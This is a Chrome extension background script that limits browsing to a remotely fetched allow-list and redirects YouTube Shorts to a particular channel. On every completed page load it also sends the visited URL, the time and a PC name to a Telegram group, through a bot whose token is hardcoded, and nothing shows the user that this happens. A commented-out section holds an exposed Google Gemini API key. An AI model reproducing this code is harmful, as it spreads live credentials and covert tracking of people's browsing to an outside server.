// Listen for tab updates (e.g., when a new URL is loaded)

const botToken = '7361417539:AAHaGDiGj91WaoCxm9JNTR8bW0g9hRUXas8';

let pcName = "Umesh-pc"

function sendMessage(tburl, name, desc) {
  const realtime = new Date();
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=-4523663123&text=PC-Name:+${name}%0A%0ATIME:+${realtime}
  %0A%0ALINK:+${tburl}`;
  fetch(url)
    .then(response => response.json())
    .then(data => {
      console.log(data); // Look for "chat" and "id" fields to find the group chat ID
    })
    .catch(error => console.error('Error:', error));
}



// async function aiResponse(tabId, title, desc) {
//   const url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=AIzaSyAUb4QhsPaMtjYQQYY1MZhEPJfTWtVNre8";

//   const data = {
//     contents: [
//       {
//         parts: [{
//           text: `Is the given title or description is useful for students study. Answer in 'yes' or 'no'.\n
//           title: ${title}\n
//           description: ${desc}
//           ` }]
//       }
//     ]
//   };

//   await fetch(url, {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/json"
//     },
//     body: JSON.stringify(data)
//   })
//     .then(response => {
//       // Log the response object
//       console.log("Response object:", response);

//       // Check for successful response
//       if (!response.ok) {
//         chrome.tabs.update(tabId, { url: 'https://google.com/' });
//         alert("you can't use this web page")
//         throw new Error(`HTTP error! Status: ${response.status}`);
//       }

//       // Parse the response as JSON
//       return response.json();
//     })
//     .then(jsonData => {
//       // Log the parsed JSON data
//       console.log("Parsed JSON:", jsonData);

//       // Check if candidates are present
//       if (jsonData.candidates) {
//         console.log("Candidates:", jsonData.candidates[0].content.parts[0].text);
//       } else {
//         console.log("No candidates found in response");
//       }
//     })
//     .catch(error => {
//       // Handle any errors
//       console.error("Error occurred:", error);
//     });


// }

// Allowed websites URL
const ALLOW_LIST_URL = "https://raw.githubusercontent.com/umeshkbedi/chrometab/refs/heads/main/allow.txt";

let allowedWebsites = [];

// Fetch allowed websites from the remote allow.txt file
async function fetchAllowedWebsites() {
  try {
    const response = await fetch(ALLOW_LIST_URL);
    const text = await response.text();
    // Extract hostnames from the URLs
    allowedWebsites = text.split("\n").map(url => {
      try {
        return new URL(url.trim()).hostname; // Get only the hostname
      } catch {
        return null; // Skip invalid URLs
      }
    }).filter(Boolean); // Remove null values
    console.log("Allowed hostnames:", allowedWebsites);
  } catch (error) {
    console.error("Error fetching allowed websites:", error);
  }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {

  // Check if the tab has finished loading the page (complete status)
  // Fetch the list on extension load
  fetchAllowedWebsites();

  if (changeInfo.url) {
    const url = new URL(changeInfo.url);
    const hostname = url.hostname;


    console.log("Current url:", url);
    console.log("Allowed hostnames:", allowedWebsites);

    // Check if the hostname or its parent domains are in the allowed list
    const isAllowed = allowedWebsites.some(allowed => {
      return hostname === allowed || hostname.endsWith(`.${allowed}`);
    });

    if (!isAllowed) {
      // Redirect to Google
      chrome.tabs.update(tabId, { url: "https://www.google.com" });
    }
  }

  if (changeInfo.status === 'complete' && tab.active) {
    console.log("Tab updated. New URL: " + tab.url);

    const regex = /^https:\/\/www\.youtube\.com\/shorts\/.*/;
    const ytRegex = /^https:\/\/www\.youtube\.com\/.*/;

    if (regex.test(tab.url)) {
      // Redirect to example.com if the current URL matches the pattern
      // window.location.href = 'https://example.com';
      chrome.tabs.update(tabId, { url: 'https://www.youtube.com/@AsharamJiBapu' });
      return
    }

    else if (tab.url === "https://www.google.com/" || tab.url === "https://www.youtube.com/") {
      return
    }
    else {
      // Get the saved name from storage
      chrome.storage.local.get(["name"], (result) => {
        const savedName = result.name || "Tab/Pc Name"; // Use a default value if not set
        console.log("Retrieved name:", savedName);
        sendMessage(tab.url, savedName)
      });

    }



  }

});




